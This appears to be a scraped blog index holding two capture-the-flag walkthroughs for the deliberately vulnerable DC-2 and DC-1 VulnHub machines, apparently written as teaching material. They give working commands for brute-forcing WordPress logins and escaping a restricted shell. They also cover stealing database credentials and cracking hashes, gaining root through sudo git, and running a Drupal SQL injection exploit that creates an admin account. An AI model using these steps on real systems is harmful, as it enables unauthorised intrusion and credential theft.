fuzzing directories. We append a forward slash / to specify directories. - e.g. export URLdir=\"http://192.168.56.111/FUZZ/\" export URLfile=\"http://*IP*/FUZZ\" –\u003e A var useful for fuzzing files. - e.g. export URLfile=\"http://192.168.56.111/FUZZ\" Let’s make sure we’ve exported the variables correctly by running echo $IP; echo $URLdir; echo $URLfile echo our $IP, $URLdir, $URLfile vars PS If you ever export variables and then create a second shell, the second shell will only contain the previously exported variables if it’s a child shell of the first. ","date":"01-31-2023","objectID":"/dc-2/:3:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Scanning and Enumeration At this point, we’re set to start scanning and enumerating DC-2! Since this is a blog post, I’m going to keep things somewhat short but feel free to dig into anything/everything you can. If you find another path to go down, do it! It can help you learn what to look for and how to prioritize those initial findings. This phase of a pentesting process can and should consume the largest amount of time, as you’re wanting to find everything you can. Not only will this help if you were to get stuck but, if this were a real world pentest, you’d want to provide the customer an accurate report by being thorough! ","date":"01-31-2023","objectID":"/dc-2/:4:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"nmap scan Anyways, let’s get to it by starting with a nmap scan against DC-2’s IP. nmap $IP -T4 -p- -sC -sV --open $IP –\u003e is the previously exported IP address of DC-2. -T4 –\u003e T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap’s Timing Templates webpage. -p- –\u003e tells nmap to scan ALL 65,535 TCP ports. -sC –\u003e specifies nmap to run default scripts. -A includes this. -sV –\u003e enables version detection. -A includes this. --open –\u003e only shows ports that are “open”. Safe against a purposely vulnerable box but not suggested for a real pentest as it may hide a reportable finding. nmap results - Linux box w/ http on 80, ssh on 7744 Analyzing nmap scan Debian Linux running services http(port 80) and ssh(port 7744). http(80) may only be accessible via hostname and not IP. Needs tested. Many reasons to this but maybe it’s hosting more than one webapp? Think VHOST. ssh(7744) running on non-default port but that doesn’t particularly mean anything. ","date":"01-31-2023","objectID":"/dc-2/:4:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Manual inspection of http(80) Let’s open a browser and visit the target IP(DC-2) and see what it shows. It’s redirecting us to “http://dc-2/” domain? If you look at the nmap results, you’ll see nmap already reported this to us. “Did not follow redirect to http://dc-2/” I’d suspect that port 80 is configured with a name-based virtual host, meaning that one IP address could host multiple sites served by the hostname only. ","date":"01-31-2023","objectID":"/dc-2/:4:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Adding DC-2 to /etc/hosts In order to tell our attack box that we want $IP to resolve to DC-2, we simply add this information to the /etc/hosts file on the attackbox. Once we’re finished with the DC-2 box, we’ll simply revert this change. sudo nano /etc/hosts A few spaces below the existing content, let’s add *IP* dc-2. NOTE! Spacing between the IP address and hostname is (1) TAB! Not spaces via SPACEBAR. Now we do keyboard combos of CTRL+O then ENTER(to save it) followed by CTRL+X(to exit) Now confirm the changes by running cat /etc/hosts End result.. added dc-2 into /etc/hosts ","date":"01-31-2023","objectID":"/dc-2/:4:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Rerun nmap after /etc/hosts update Look how our redirect is working and nmap is able to grab the proper banners! nmap results after /etc/hosts update - proper banners ","date":"01-31-2023","objectID":"/dc-2/:4:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Reinspecting http(80) Let’s visit http://dc-2 in our browser.. Access to the webapp, finally! Looks like WordPress. Wordpress CMS found CMS stands for Content Management System. It’s an app that allows multiple contributors to create, manage, and modify content on a website. Wordpress(WP) is a common CMS in the wild. ","date":"01-31-2023","objectID":"/dc-2/:4:5","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Updating our notes Let’s notate what we’ve found and what possible tools/techniques to try. As we move forward, let’s continue to update our notes. Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 80 : Apache httpd 2.4.10 Added “192.168.56.111 dc-2” to attackbox /etc/hosts to allow access of WP CMS 80 : Wordpress 4.7.10 What to try: view source, file/directory busting/fuzzing, wpscan 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) What to try: searchsploit for vulns When finished, remove IP dc-2 from /etc/hosts file ","date":"01-31-2023","objectID":"/dc-2/:4:6","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Fuzzing http/80 Now that we can access the webapp as intended, let’s move onto fuzzing! Fuzzing is a technique used to inject something into an app and filter the responses. Since we’re dealing with a webapp, we’ll be using a tool called wfuzz to brute-force the webapp’s file and directory paths. wfuzz will simply brute-force the webapp’s file/directory parameter(or wherever we place the wordFUZZ), against a specified wordlist. For each word sent, it’ll record the webapp’s response. We then filter out the responses we don’t need, like 404’s, and a list is created! This can help us find hidden login pages, accidentally exposed files, etc. and save us lots time! There’s various tools that can accomplish this task e.g. dirbuster, ffuf, wfuzz, etc but today I’ll stick with wfuzz. I’ll make sure to use different tools on DC-3, so we don’t become repetitive and boring. Promise! 😉 I suggest you try any trusted tools and find your favorites. Go check out the resources page as it contains a large list of tools. Fuzzing $URLfile Let’s start with fuzzing files by running the following command. wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile -c –\u003e provides a color output for the webapp’s response column. -z file,/*wordlist* –\u003e specifies payload type and points to file wordlist. --hc 403,404 –\u003e tells wfuzz not to display any 403 or 404 responses. $URLfile –\u003e is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. Let’s manually visit each recorded response, in our browser, to see what it presents! ignore the last 404 Wordlist Tip If you lack the SecList wordlists(already included in Kali’s repo), you can find it at Daniel Miessler’s Github Page. It’s a collection of various lists that can be used for various assessments! Very useful! SecLists works great for CTFs but for real world pentesting, you’ll may be using custom or something found in my resources posts. wfuzz results - files files worth notating http://dc-2/xmlrpc.php –\u003e XML-RPC API? We can use this to brute-force logins without restrictions. The wpscan tool can abuse this. We’ll use wpscan later! http://dc-2/wp-login.php –\u003e wp login page Potential login abuse techniques? Think email/user enumeration or brute-forcing. http://dc-2/readme.html –\u003e info disclosure. versioning? PHP, MySQL, mod_rewrite apache module? Injections? Targeted exploits? http://dc-2/wp-links-opml.php –\u003e info disclosure. WP 4.7.10 confirmed Fuzzing $URLdir Let’s now fuzz against directories. We’ll simply change the exported variable and wordlist options in our previous command. wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 $URLdir -z file,/*wordlist* –\u003e changed to a directories wordlist. $URLdir –\u003e exported variable that includes appended backslash, so wfuzz searches for directories. Let’s manually visit each recorded response, in our browser, to see what it presents! ignore the last three responses wfuzz results - directories directories worth notating http://dc-2/wp-includes/ –\u003e contains core WP file/folders http://dc-2/wp-includes/css/jquery-ui-dialog.min.css shows jQuery 1.11.4? Version may be wrong when compared to whatweb. http://dc-2/wp-admin/ –\u003e contains file/folders to the WP dashboard panel but redirects to /wp-login.php http://dc-2/wp-content/ –\u003e contains plugins/themes for WP ","date":"01-31-2023","objectID":"/dc-2/:4:7","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Confirm WebTech with Wappalyzer Regarding the potential WebTech findings in the /readme.html file, let’s confirm those by visiting the site with a browser extension called Wappalyzer. To start using, simply: Install it through the browser’s extension manager Visit http://dc-2 with our browser and see which tech stack it’s using. Wappalyzer Results We’re able to confirm: Wordpress 4.7.10 –\u003e Confirmed with nmap after /etc/hosts update Apache HTTP Server 2.4.10 –\u003e Confirmed with nmap PHP –\u003e Found potential use through /readme.html. Version 5.2.4? Debian –\u003e Found through apache 404 error. Info Disclosure MySQL –\u003e Found in /readme.html. Version 5.0? jQuery 1.12.4 and jQuery Migrate 1.4.1. Versioning is off to our 1.11.4 finding. –\u003e Found in /wp-includes directory. Version 1.11.4? Twenty Seventeen Theme –\u003e Found with wpscan. Version 1.2? ","date":"01-31-2023","objectID":"/dc-2/:4:8","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Findings \u0026 Updating Notes We have some additional info to add into our notes. Let’s also create a to-do section. PS If you attempt admin:password, at the /wp-login page, you’ll see that username enumeration is possible! If the XML-RPC API wasn’t enabled, we could possibly attack this login page. /wp-login.php user enum possible TO-DO LIST Things to check: Use wpscan to: enumerate usernames brute-force WP login by abusing the XML-RPC API? Maybe create a custom wordlist? Hint from Flag 1 referencing a tool called cewl. Once we have shell, look for MySQL database as it may include sensitive information. NOTES Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 USERS : WP –\u003e admin , 80 : Apache httpd 2.4.10 Added “192.168.56.111 dc-2” to attackbox /etc/hosts to allow access of WP CMS mod_rewrite module exploits? 80 : Wordpress 4.7.10 Username enumeration is possible at /wp-login.php /xmlrpc.php API enabled, so wpscan can be used to brute-force /wp-includes/ , /wp-admin/ , /wp-content/ directories found 80 : PHP 5.2.4??? Injection attacks? 80 : MySQL 5.0??? Injection attacks? 80 : jQuery 1.12.4 \u0026 jQuery Migrate 1.4.1??? XSS attacks? 80 : Twenty Seventeen Theme 1.2??? Potential exploits? 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) searchsploit for vulns attempt logins via brute-force or once we enumerate potential usernames/passwords When finished, remove IP dc-2 from /etc/hosts file ","date":"01-31-2023","objectID":"/dc-2/:4:9","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"wpscan - Enumerating Usernames wpscan is a wordpress security scanner that allows us to assess wordpress apps. Our goal is to use wpscan to enumerate usernames, cewl to create a custom password list, and finally use wpscan to brute-force logins via the XML-RPC API that’s enabled, as it doesn’t limit login attempts. To enumerate users with wpscan, simple run wpscan --url http://dc-2. Looks like we have three WP users, including the admin user we’ve already confirmed via /wp-login.php. Let’s add these users to our notes. admin; jerry; tom wpscan - user enumeration ","date":"01-31-2023","objectID":"/dc-2/:4:10","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"CeWL - Creating word lists CeWL, Custom Word List Generator, spiders the specified URL and creates a list per the flags specified. After a little googling(google is your friend!), it looks like wordpress uses a 10 character minimum requirement. So, we’ll be sure to use the flag -m with a argument of 10 to specify this minimal length requirement. If you haven’t already, create a folder to store any related dc-2 files into, including the next cewl file we create. Now let’s run the cewl tool! cewl http://dc-2:80/ -m 10 -w $PWD/dc-2-cewl.txt -m 10 –\u003e specifies the minimum length of 10 characters -w $PWD/dc-2-cewl.txt –\u003e tells cewl to export file name “dc-2-cewl.txt” into the current working directory(var of $PWD) cat dc-2-cewl.txt and you’ll see these results. cewl results Let’s also create a list for usernames called dc-2-users.txt, so we can use it along side the password list, dc-2-cewl.txt, we just created. echo -e \"admin\\njerry\\ntom\" \u003e dc-2-users.txt -e–\u003e echo recognizes \\n(new line), and others additional syntax. \u003e –\u003e overwrites data in the “dc-2-users.txt” file Now that we have some usernames and a custom password wordlist, let’s update our notes and then exploit the XML-RPC API 😃 ","date":"01-31-2023","objectID":"/dc-2/:4:11","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Updating notes before exploiting TO-DO LIST Things to check: Use wpscan to: Brute-force WP XML-RPC with wpscan, dc-2-users.txt, and dc-2-cewl.txt After we get into wordpress, look for injection points, vulnerable plugins, etc Once we have shell, look for MySQL database as it may include sensitive information. NOTES Box Name : DC-2 (DC Series) OS : Debian (Linux) IP : 192.168.56.111 USERS : WP(admin;jerry;tom) 80 : Apache httpd 2.4.10 Added “192.168.56.111 dc-2” to attackbox /etc/hosts to allow access of WP CMS mod_rewrite module exploits? 80 : Wordpress 4.7.10 Username enumeration is possible at /wp-login.php /xmlrpc.php API enabled, so wpscan will be used to brute-force /wp-includes/ , /wp-admin/ , /wp-content/ directories found 80 : PHP 5.2.4??? Injection attacks? 80 : MySQL 5.0??? Injection attacks? 80 : jQuery 1.12.4 \u0026 jQuery Migrate 1.4.1??? XSS attacks? 80 : Twenty Seventeen Theme 1.2??? Potential exploits? 7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) searchsploit for vulns attempt logins via brute-force or once we enumerate potential usernames/passwords When finished, remove IP dc-2 from /etc/hosts file ","date":"01-31-2023","objectID":"/dc-2/:4:12","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Exploiting ","date":"01-31-2023","objectID":"/dc-2/:5:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Abusing WP XML-RPC XML-RPC is an API that allows another application to publish, edit, delete posts, upload new files, get a list of commands, edit comments all through a POST request. The reason this API is nice for attacks is there’s no limits or throttling to the amount of requests we send, plus it allows access to many different WP features. Since we’re going to be brute-forcing the login creds of a wordpress site, wpscan will first check and, if present, use this XML-RPC API as the attack vector. If it is absent, wpscan will shift to using the wp-login.php login fields. ","date":"01-31-2023","objectID":"/dc-2/:5:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Validating WP Creds Let’s get to it and run the attack against XML-RPC wpscan --url http://dc-2/ --disable-tls-checks -U dc-2-users.txt -P dc-2-cewl.txt --url –\u003e specifies the URL to attack which is DC-2’s WP site --disable-tls-checks –\u003e disables TLS checks for HTTPs as we’re on HTTP -U –\u003e location of the username list to be used -P –\u003e location of the password list to be used wpscan - verified two valid combinations We have two valid credentials for WP; jerry:adipiscing tom:parturient After logging into both accounts, it looks like they’re limited accounts. I was unable to upload *.php files through the media upload form. The plugins and themes pages are also absent, meaning we lack access to abusing them. So, without digging into this further, I think we’re meant to go about this by other means. So, let’s try using the credentials, we validated against wordpress, against the SSH service on port 7744! Maybe we’ll get lucky and get ssh access into the debian server(dc-2). ","date":"01-31-2023","objectID":"/dc-2/:5:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Credential reuse on SSH/7744 Let’s try logging in as jerry: ssh jerry@dc-2 -p 7744 answer yes try adipiscing –\u003e Permission denied, please try again. try parturient –\u003e Permission denied, please try again. CTRL+C to cancel our attempts as jerry Try again but with username “tom”: ssh tom@dc-2 -p 7744 try parturient We’re in!!! tom@dc-2 -p 7744 successful! ","date":"01-31-2023","objectID":"/dc-2/:5:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Escaping a Restricted Shell We’ve gained shell but it’s restricted. By running ls $PATH, we’ll see that we are limited to four binaries: less, ls, scp, vi If you run any other command, you’ll see the -rbash reference meaning “restricted bash”. rbash - restricted bash So first thing is first, we need to escape this restricted shell that user “tom” is restricted to. We can use vi to escape the restricted shell. In our SSH terminal: vi type :set shell=/bin/bash then enter type :shell then enter This will escape the restricted shell and we can confirm by running cd /. Once we’ve gained shell, it’s nice to establish a proper and stable shell with tty. As we’re connected through SHH, we won’t need to spawn a shell through python but setting up PATH variables, etc will make our life easier. Anything struck-through represents that the command isn’t needed as we’re using SSH to establish a stable shell. python -c 'import pty; pty.spawn(\"/bin/bash\")' –\u003e spawn an interactive shell via python export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp –\u003e setting additional PATH variables export TERM=xterm-256color –\u003e provides us some color in our output alias ll='ls -lsaht --color=auto' –\u003e sets an alias ll that runs ls -lsaht --color=auto Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 We should now have a unrestricted, fully interactive tty shell, with a ll command that runs ls -lsaht --color=auto BUT we’re still restricted in the form of system permissions. Hence, we’re moving onto privesc! ","date":"01-31-2023","objectID":"/dc-2/:5:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Privilege Escalation ","date":"01-31-2023","objectID":"/dc-2/:6:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Enumerating user tom Let’s run through some simple enumeration of the current user, tom, and see if we can find anything to steal or exploit! sudo -l –\u003e requests for a password and no password, we know, works. find / -perm -u=s -type f 2\u003e/dev/null –\u003e as we lack sudo, none of the SUID or GUID binaries allow for privesc abuse. mysql access is denied for tom. Same issue with sudo. No working password. (It’s forcing us to follow a path…) cat ~/.bash_history –\u003e nothing interesting in bash history. Let’s not forget that we may have access to the WP CMS webroot! Maybe we can steal sensitive information within the database? cd /var/www/html –\u003e Looks like we now have access to the WP files! After digging around in the html folder, I found that the wp-config.php contains MySQL creds! wpadmin:4uTiLL wpadmin:4uTiLL creds in wp-config.php Future me reporting in… To root this box, we’re not needing to gather this SQL info nor do we need to crack hashes. We could skip this section and move onto Abusing jerry’s sudo privs with git but what’s the fun in that! ","date":"01-31-2023","objectID":"/dc-2/:6:1","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Hash algorithms w/ hash-identifier We have three hashes to crack. admin:$P$BXC3GjdXdWYQbzZwQRv2hTo4XRtadY. tom:$P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO. jerry:$P$BRCcbpudGlBukTwA7kJsb.rafAL4il. To crack them, we’ll be using a tool called hashcat, but first, we need to determine which hash algorithm was used. SHA1, MD5, etc? hash-identifier is the perfect tool for this. Open up a new terminal and leave our current SSH connection alone, as we still need it! hash-identifier –\u003e this will execute and open the program’s CLI. We will simply copy/paste one of the hashes into the command-line and hit the ’enter’ key. hash-identifier responds with MD5(wordpress) Hit CTRL+C, to exit, and let’s now get into hashcat We now know we’re dealing with a MD5(WordPress) hash algorithm. ","date":"01-31-2023","objectID":"/dc-2/:6:2","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Cracking hashes with hashcat hashcat is a “password recovery” tool that utilizes your CPU and, if properly configured, your GPU to crack hashes. In this example, we’ll be using the CPU. Technique becomes very important when cracking hashes, as it may differentiate between minutes vs days when cracking a hash We know the hashes were made using the “Wordpress(MD5)” algorithm, so we need to make sure we tell hashcat this. Let’s start by looking up which argument we should provide to the flag -m. m is the flag that we use to specify which algorithm we’re attacking. There’s many lists our there but here’s a quick reference. Generic Hash Types Simply CTRL+F for “WordPress” and you’ll land on a argument value of 400. Now we know which argument value to provide the flag -m. PS - Export the three found hashes, that were in the MySQL database, into a text file as we’ll need to specify that file in our hashcat command Let’s attack the hashes with our previously created cewl list called dc-2-cewl.txt. hashcat -m 400 -a 0 *location/hashes-to-crack.txt* dc-2-cewl.txt m –\u003e specifies the algorithm the hashes were created with. a 0 –\u003e tell hashcat to do a straight attack, meaning it’ll run straight through each word without altering it’s structure/order of characters. We’re able to crack the two previously found passwords but not the admin password… $P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO.:parturient $P$BRCcbpudGlBukTwA7kJsb.rafAL4il.:adipiscing two hashes cracked, admin not cracked Since we have the hashes and know the algorithm, we could crack the admin password at a later time but I’ll pass. We’ve stolen the sensitive data from the MySQL database and ran through some cewl / hashcat examples. The concepts are what matter here. 😃 ","date":"01-31-2023","objectID":"/dc-2/:6:3","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"Abusing jerry’s sudo privs with git Since it seems the box wants us to go for jerry now(tom \u0026 jerry cartoon…), let’s login as jerry by: su jerry –\u003e enter the WP password we found for jerry –\u003e adipiscing We’re in as jerry! sudo -l –\u003e looks like jerry has root privs to the binary git jerry - sudo -l shows git as root! What do you know… git can be abused(confirmed via GTFObins), if the user has sudo perms, to gain privesc! Let’s gain root! sudo git -p help config –\u003e enter !/bin/sh –\u003e enter ","date":"01-31-2023","objectID":"/dc-2/:6:4","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"ROOTED! ROOTED! ","date":"01-31-2023","objectID":"/dc-2/:7:0","tags":["CTF (self-hosted)"],"title":"DC-2 of the DC Series","uri":"/dc-2/"},{"categories":["VulnHub"],"content":"DC-1 from the DC-Series(VulnHub).","date":"01-20-2023","objectID":"/dc-1/","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Let’s root DC-1! Details can be found at https://www.five86.com/dc-1.html Open this to see the box's overview pulled from the above website. DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS. There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this, however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge. If you’re ever needing to find the IP of a local box, sudo netdiscover -r *ip/cidr* will do the trick. -r specifies the range. If this tool doesn’t work, you could have routing issues. -i can specify the interface you need to run against. Another nifty tool is ip route get *ip* as this will tell you what route a packet will take to the ip specified. Anyways.. to the box! ","date":"01-20-2023","objectID":"/dc-1/:0:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Export Environment Variables Exporting variables can help speed up some tasks, e.g., insert IP address into a command or when we fuzz directories and files of a webapp address. Your IP value will most likely differ, so adjust accordingly: export IP=\"192.168.56.110\" export URLdir=\"http://192.168.56.110/FUZZ/\" \u003c– Directories export URLfile=\"http://192.168.56.110/FUZZ\" \u003c– Files appended backslash depicts directories vs files 😃 You can then test your exported vars by running echo $varname: e.g., echo $IP would respond with 192.168.56.110. ","date":"01-20-2023","objectID":"/dc-1/:1:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Scanning \u0026 Enumeration Before we move forward, let’s make a list that’ll include the important bits as we move forward. We’ll add/update as we go through the box, so we can reference it. Box Name: DC-1 IP: 192.168.56.110 ","date":"01-20-2023","objectID":"/dc-1/:2:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"nmap Let’s start with a simple nmap scan to see what we’re playing with: nmap $IP -T4 -p- -A --open $IP = target’s IP via exported variable. -T4 = T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap’s Timing Templates webpage. -p- = Tells nmap to scan all ports(TCP by default).. -A = Runs four options under one: OS detection Version detection Script scanning Traceroute --open = runs -A only against ports that are open. Idea is to speed up slow scans. Running a local box won’t cause much issues but when you’re running a slower scan or the latency is high, this option can help. DC-1 nmap scan Let’s start with port 80 as it’s most likely the weakest entry point due to the potential services listed in robots.txt. SSH, on port 22, isn’t much use as we currently lack keys, usernames, and passwords. We could brute force but it’ll take a while and it’s not guaranteed to work. rpc could be of use but I’m not seeing anything obvious in the list of services, so we’ll skip this for now. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22- Drupal CMS v7.xx - \u003c– Focus here first 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"01-20-2023","objectID":"/dc-1/:2:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Manual Inspection of 80/webapp Open up a browser and enter the box’s IP address to visit the IP’s http service. Since it’s running on port 80, there’s no need to specify the port eg. 192.168.56.110 :80 DC-1 http service Manually inspect the page source. Findings are: Drupal 7 = nmap already told us this Page Source of Drupal Let’s see if we can enumerate the responses regarding the login fields at the /user/ directory No response allows us to differentiate between username nor passwords. If we could get a response saying “This email does not exist”, then that would allow us to brute force enumerate emails. Login Enum Fail Same goes for recovering an account. Forgot Enum Fail Default credentials? Seems like that’s a negative. Drupal forces a password change when logging in for the first time. Answer found via google 😃 /robots.txt shows possible services running. Possibility for injections? PHP, SQL? Worth noting. sqlite mysql php POST responses show the Apache/2.2.22 (Debian) versioning, which nmap already found. POST also shows PHP/5.4.45-0+deb7u14. nmap didn’t see this. Box Name: DC-1 IP: 192.168.56.110 OS: Debian(Linux) Ports \u0026 Service: 80 - Apache httpd 2.2.22 - Drupal CMS v7.xx - php 5.4.45-0+deb7u14 - sql ? 111 - rpcbind 43450 - rpcbind related 22 - ssh - least attractive since we have no usernames, passwords, or keys ","date":"01-20-2023","objectID":"/dc-1/:2:2","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Fuzzing webapp/80 I tried fuzzing but it didn’t result in anything interesting beyond what robots.txt already told us. Example commands would be… wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLfile wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLdir I also tried dirbuster with similar results. Some results I got were: 000000007: 200 54 L 164 W 3151 Ch “install.php” 000000005: 200 0 L 6 W 42 Ch “xmlrpc.php” 000000237: 200 9 L 15 W 283 Ch “rss.xml” ","date":"01-20-2023","objectID":"/dc-1/:2:3","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Researching Vulnerabilities I was hoping to find something more than just a general version 7 of Drupal… e.g., 7.26, but that’s okay. Let’s go ahead and run searchsploit against Drupal and see what we get back. searchsploit Drupal DC-1 Drupal 7 searchsploit Well, good news is there isn’t many version 7 exploits! We’re looking for RCE(remote code execution) as it will provide us the quickest/easiest way into the system. We also want something that doesn’t require authentication, although we can make a user at /user/register. There’s always the chance a non-privileged user would have enough privs to execute such an exploit. The Drupalgeddon2 sticks out to me but I want a more manual approach and something that’ll be sure to work with version 7.xx … Let’s go with the php/webapps/34992.py. We could use msfconsole and let that automate most of what we’ll do below, but what’s the fun in that! My thought process is that we’ll create an admin account in drupal and see what drupal has to offer. We saw PHP and SQL in robots.txt, so we’ll most likely have a way in through those. Speaking of SQL, 34992.py script will be using SQLi, so that’s a start… Download the script to a local directory and cat the contents… searchsploit -m php/webapps/34992.py \u003c– This will download the script to the current directory using searchsploit. Love this feature. cat 34992.py \u003c– This will output the contents of the .py script, so we can dig into it and alter code if needed. Many scripts don’t hold your hand, so knowing how to read code is very helpful. You’ll see this line which tells us the command options needed, so we can successfully execute the script against the target. DC-1 Drupal 7 exploit usage: %prog **-t http[s]://TARGET_URL -u USER -p PASS**\\n So we’ll try… python2 34992.py -t http://$IP -u owned -p owned This will hopefully create an admin account we can login to via the homepage of Drupal. From there the goal is to look for a way to upload a malicious php file. eg a reverse shell or possibly a plugin to exploit. Who knows. I’m just guessing but since this is a CMS(Drupal) and most likely running PHP, I bet our chances are good. ","date":"01-20-2023","objectID":"/dc-1/:3:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploitation Well… let’s get to it. python2 34992.py -t http://$IP -u owned -p owned IF YOU GET A “SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(…)?”… you’re not running the script under python2… which is required. DC-1 Drupal 7 admin created Now let’s test the login page… with owned:owned. ADMIN LOGGED IN DC-1 Drupal 7 admin logged in Now that we’re in a CMS, we should look around and enumerate what we can… ","date":"01-20-2023","objectID":"/dc-1/:4:0","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Enumerating Drupal admin pages It’s important to gather as much information as you can as it might come into handy later on… so let’s see what we can find inside Drupal as admin. Username Fred found Username admin found So brute forcing may have been an option but maybe it has lockout? flag3 is found under content… Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow. This seems to hint to maybe the find command allowing us access to certain files we shouldn’t have access to? Sticky bit? Worth checking once we’re in… Let’s look in the module tab and see if there’s anything php related… I found and enabled the follow module… “PHP filter”. It may just allow us to upload malicious PHP code. DC-1 Drupal 7 Enabled PHP Filter Not that it’s enabled, we should see if we can give it administrator rights.. Click the “Permissions” and then check the “administrator” user box for “Use the PHP code text format” DC-1 Drupal 7 PHP code permissions DC-1 Drupal 7 admin perms for php code I’m hoping by checking the admin box, this will allow any code inputted to be executed with admin privs. ","date":"01-20-2023","objectID":"/dc-1/:4:1","tags":["CTF (self-hosted)"],"title":"DC-1 of the DC Series","uri":"/dc-1/"},{"categories":["VulnHub"],"content":"Exploiting PHP module Now that it’s enabled, lets see if we can create a PHP page under content. Maybe we can inject php code, like the php revshell by pentestmonkey! Or we may be able to grab the /etc/passwd file to see what users are on the box. Even better /etc/shadow file…, if we have root privs.. doubtful. Content \u003e Add Content \u003e Basic Page Title = Whatever you want Body is where we’ll test the injection… 